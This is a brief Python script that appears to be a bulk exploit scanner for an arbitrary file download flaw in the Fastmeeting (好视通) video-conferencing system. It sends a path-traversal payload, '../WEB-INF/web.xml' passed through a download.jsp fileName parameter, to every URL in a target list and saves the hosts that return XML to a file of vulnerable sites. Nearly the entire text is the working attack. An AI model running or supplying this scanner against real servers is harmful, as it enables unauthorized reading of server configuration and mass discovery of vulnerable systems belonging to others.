
import json
import requests


urls = open('url.txt')

poc = '/action/usermanager.htm'

for i in urls:
    url = i.rstrip("\n")
    payload = "/dbbackup/adminMgr/download.jsp?fileName=../WEB-INF/web.xml"
    vulnurl = url + payload
    try:
        req = requests.get(vulnurl, timeout=10, verify=False)
        if req.headers["Content-Type"] == "application/xml":
            print("[+]存在好视通视频会议系统(fastmeeting)任意文件下载漏洞...(高危)\tpayload: " + vulnurl, "red")
            with open('漏洞.txt', 'a')as f:
                f.write(str(vulnurl) + '\n')
        else:
            print("[-]不存在fastmeeting_download_filedownload漏洞", "white", "on_grey")

    except:
        print("[-] " + __file__ + "====>可能不存在漏洞", "cyan")